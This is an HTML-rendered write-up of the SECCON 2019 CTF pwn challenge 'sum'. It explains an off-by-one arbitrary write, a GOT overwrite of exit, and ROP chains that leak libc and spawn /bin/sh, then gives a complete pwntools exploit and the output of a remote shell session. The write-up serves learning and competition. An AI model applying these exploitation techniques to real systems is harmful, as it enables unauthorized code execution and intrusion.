I"ðt<p>I didnâ€™t get much time this weekend for this CTF due to having to study for two tests. I only spent a couple hours and managed to solve <code class="highlighter-rouge">one</code> and <code class="highlighter-rouge">sum</code>, the two easy pwn challenges.</p>

<p><code class="highlighter-rouge">sum</code> was a pwn challenge with a simple concept. It acted as a calculator, allowing you to sum up to 5 numbers together and giving you the result.</p>

<p>Although Iâ€™d classify the challenge as easy, Iâ€™d say it was a VERY unique challenge since Iâ€™ve never seen a challenge like this before, which may be the reason it had less solves compared to <code class="highlighter-rouge">one</code>.</p>

<h3 id="challenge"><strong>Challenge</strong></h3>

<ul>
  <li><strong>Category:</strong> pwn</li>
  <li><strong>Points:</strong> 289</li>
  <li><strong>Solves:</strong> 58</li>
</ul>

<blockquote>
  <p>uouo</p>

  <p><code class="highlighter-rouge">sum.chal.seccon.jp 10001</code></p>

  <p>Estimated Difficulty: easy</p>

  <ul>
    <li><a href="https://score-quals.seccon.jp/files/sum_ccafa40ee6a5a675341787636292bf3c84d17264">sum</a></li>
    <li><a href="https://score-quals.seccon.jp/files/libc.so_18292bd12d37bfaf58e8dded9db7f1f5da1192cb">libc.so</a></li>
  </ul>
</blockquote>

<h3 id="solution"><strong>Solution</strong></h3>

<p>The binary wasnâ€™t stripped, making it very easy to reverse. It had the following characteristics:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/seccon-2019/sum<span class="nv">$ </span>checksec <span class="nb">sum</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/seccon-2019/sum/sum'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</code></pre></div></div>

<p>The functions look like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">long</span> <span class="kt">long</span> <span class="n">int_array</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
  <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ref_total</span><span class="p">;</span>
  <span class="kt">long</span> <span class="kt">long</span> <span class="n">total</span><span class="p">;</span>

  <span class="n">int_array</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">ref_total</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">total</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"[sum system]</span><span class="se">\n</span><span class="s">Input numbers except for 0.</span><span class="se">\n</span><span class="s">0 is interpreted as the end of sequence.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"[Example]</span><span class="se">\n</span><span class="s">2 3 4 0"</span><span class="p">);</span>
  <span class="n">read_ints</span><span class="p">(</span><span class="n">int_array</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">sum</span><span class="p">(</span><span class="n">int_array</span><span class="p">,</span> <span class="n">ref_total</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">5</span> <span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%llu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">total</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">read_ints</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">int_array</span><span class="p">,</span> <span class="kt">int</span> <span class="n">num_of_ints</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">num_of_ints</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="c1">// Off by one error</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">"%lld"</span><span class="p">,</span> <span class="n">int_array</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">int_array</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="c1">// Read until a 0</span>
      <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">sum</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">int_array</span><span class="p">,</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ref_total</span><span class="p">)</span>
<span class="p">{</span>
  <span class="o">*</span><span class="n">ref_total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">*</span><span class="p">(</span><span class="n">int_array</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="o">*</span><span class="n">ref_total</span> <span class="o">+=</span> <span class="o">*</span><span class="p">(</span><span class="n">int_array</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">i</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So essentially, <code class="highlighter-rouge">read_ints</code> is <strong><em>supposed</em></strong> to read in 5 integers and add them together, storing them in the <code class="highlighter-rouge">int_array</code> variable in <code class="highlighter-rouge">main</code> which is passed by reference into <code class="highlighter-rouge">read_ints</code>.</p>

<p>However, as is evident, there is an off by one error in the for loop in <code class="highlighter-rouge">read_ints</code> which actually lets us overwrite <code class="highlighter-rouge">ref_total</code> in main by inputting 6 numbers, since <code class="highlighter-rouge">ref_total</code> comes immediately after the declaration for <code class="highlighter-rouge">int_array</code>. This means the <code class="highlighter-rouge">ref_total</code> will be set to the 6th number we input.</p>

<p>Due to this off by one, we can control <code class="highlighter-rouge">ref_total</code>, and since we control <code class="highlighter-rouge">ref_total</code>, we have an arbitrary write primitive when the <code class="highlighter-rouge">sum</code> function is called, since it will add all the numbers in <code class="highlighter-rouge">int_array</code> up and store it into <code class="highlighter-rouge">*ref_total</code>.</p>

<p>The next thing to be aware of is that if <code class="highlighter-rouge">sum</code> returns more than 5 (i.e if it returns the fact that it added up more than 5 numbers), then <code class="highlighter-rouge">exit</code> gets called. If we <strong><em>do</em></strong> perform an overwrite, weâ€™ll have inputted 6 numbers, meaning <code class="highlighter-rouge">sum</code> will return 6, thus <code class="highlighter-rouge">exit</code> will definitely get called.</p>

<p>First instinct would be to overwrite <code class="highlighter-rouge">exit</code> with <code class="highlighter-rouge">main</code>. However, that wonâ€™t help at all, since that doesnâ€™t provide us any way to get a leak. We canâ€™t control the first arguments of any of the functions, so looping back to <code class="highlighter-rouge">main</code> like that would be useless.</p>

<p>After some time of thinking and tinkering around with GDB, I found that just before <code class="highlighter-rouge">exit</code> is called in <code class="highlighter-rouge">main</code>, the 6 numbers we input are all on the stack. This means that when the <code class="highlighter-rouge">call exit</code> instruction happens, first the return address will be pushed to the stack, then execution will jump to <code class="highlighter-rouge">exit</code>.</p>

<p>Knowing this, if we overwrite <code class="highlighter-rouge">exit</code> with a <code class="highlighter-rouge">pop anything; ret</code> gadget, this return address will be popped off the stack, and then our program will return into the first integer we entered for the <code class="highlighter-rouge">sum</code> function. We can do a 5 gadget ROP chain in this way to get a leak (since the 6th number needs to be a valid pointer, otherwise <code class="highlighter-rouge">sum</code> will crash when writing into <code class="highlighter-rouge">*ref_total</code>).</p>

<p>The other interesting part about the challenge is that whatever value we overwrite <code class="highlighter-rouge">*ref_total</code> with will need to be carefully calculated since the final write value will depend on the functionality of the <code class="highlighter-rouge">sum</code> function. I will leave that as an exercise to the reader to figure out exactly how my exploit overwrites with the specific values. If you really canâ€™t figure out how it works, feel free to email me or DM me on twitter.</p>

<p>First, overwrite <code class="highlighter-rouge">exit_got</code> with a <code class="highlighter-rouge">pop rdi; ret</code> gadget, and make sure that the first number we enter is <code class="highlighter-rouge">main</code>â€™s address, so that the <code class="highlighter-rouge">ret</code> in <code class="highlighter-rouge">pop rdi; ret</code> will jump back to main:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># overwrite exit_got with pop rdi; ret
</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'{} {} {} -1 +1 {}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="o">-</span><span class="n">main</span><span class="p">,</span> <span class="n">pop_rdi</span> <span class="o">-</span> <span class="n">exit_got</span><span class="p">,</span> <span class="n">exit_got</span><span class="p">))</span>
</code></pre></div></div>

<p>Now that we have a way to control code execution any time we input 6 numbers, we can start with our ROP chains.</p>

<p>The first thing to note is that no matter what we do, we <strong><em>will</em></strong> overwrite <strong><em>something</em></strong> in memory. Because of this, I chose the address 0x601080 in the <code class="highlighter-rouge">.bss</code> segment, which was already empty. Any time we do our ROP chain, I simply overwrote that address, which didnâ€™t affect the rest of the program.</p>

<p>For our first ROP chain, I simply called <code class="highlighter-rouge">puts(puts_got)</code> to get a leak. We have to put a <code class="highlighter-rouge">ret</code> gadget before calling <code class="highlighter-rouge">puts</code> to align the stack (because the provided libc is 2.27). Note that <code class="highlighter-rouge">garbage</code> refers to the address 0x601080 in the <code class="highlighter-rouge">.bss</code> segment I just mentioned.</p>

<p>In order to parse the leak though, the remote binary behaved differently to locally, which is why you see the <code class="highlighter-rouge">p.recvuntil</code> that only runs if we run the exploit remotely:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ROP to get libc leak
</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'{} {} {} {} {} {}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ret</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="p">,</span> <span class="n">puts_got</span><span class="p">,</span> <span class="n">puts</span><span class="p">,</span> <span class="n">main</span><span class="p">,</span> <span class="n">garbage</span><span class="p">))</span>

<span class="c1"># Remote binary behaves differently for whatever reason
</span><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'0</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'/bin/sh: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
</code></pre></div></div>

<p>After the libc leak, itâ€™s just another ROP chain to call <code class="highlighter-rouge">system('/bin/sh')</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ROP to system('/bin/sh')
</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'{} {} {} 1 1 {}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">bin_sh</span><span class="p">,</span> <span class="n">system</span><span class="p">,</span> <span class="n">garbage</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Flag: <code class="highlighter-rouge">SECCON{ret_call_call_ret??_ret_ret_ret........shell!}</code></p>

<h3 id="final-exploit"><strong>Final Exploit</strong></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./sum'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'sum.chal.seccon.jp'</span><span class="p">,</span> <span class="mi">10001</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.27.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"LOCAL PROCESS"</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"REMOTE PROCESS"</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="s">"handle SIGALRM ignore</span><span class="se">\n</span><span class="s">"</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">bp</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
    <span class="n">debug</span><span class="p">([</span><span class="mh">0x40099d</span><span class="p">])</span> <span class="c1"># 
</span>
<span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
<span class="n">exit_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'exit'</span><span class="p">]</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
<span class="n">puts</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">garbage</span> <span class="o">=</span> <span class="mh">0x601080</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400a43</span>
<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x4005ee</span>

<span class="c1"># overwrite exit_got with pop rdi; ret
</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'{} {} {} -1 +1 {}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="o">-</span><span class="n">main</span><span class="p">,</span> <span class="n">pop_rdi</span> <span class="o">-</span> <span class="n">exit_got</span><span class="p">,</span> <span class="n">exit_got</span><span class="p">))</span>

<span class="c1"># ROP to get libc leak
</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'{} {} {} {} {} {}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ret</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="p">,</span> <span class="n">puts_got</span><span class="p">,</span> <span class="n">puts</span><span class="p">,</span> <span class="n">main</span><span class="p">,</span> <span class="n">garbage</span><span class="p">))</span>

<span class="c1"># Remote binary behaves differently for whatever reason
</span><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'0</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'/bin/sh: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>

<span class="c1"># ROP to system('/bin/sh')
</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'{} {} {} 1 1 {}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">bin_sh</span><span class="p">,</span> <span class="n">system</span><span class="p">,</span> <span class="n">garbage</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/seccon-2019/sum<span class="nv">$ </span>./exploit.py REMOTE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/seccon-2019/sum/sum'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/seccon-2019/sum/libc-2.27.so'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
REMOTE PROCESS
<span class="o">[</span>+] Opening connection to sum.chal.seccon.jp on port 10001: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leak: 0x7f0b9fdab9c0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f0b9fd2b000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x7f0b9fd7a440
<span class="o">[</span><span class="k">*</span><span class="o">]</span> /bin/sh: 0x7f0b9fedee9a
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
/bin/sh: 1: 0: not found
<span class="nv">$ </span><span class="nb">ls
</span>bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
<span class="nb">sum
</span>sys
tmp
usr
var
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
SECCON<span class="o">{</span>ret_call_call_ret??_ret_ret_ret........shell!<span class="o">}</span>
<span class="nv">$ </span> 
</code></pre></div></div>
:ET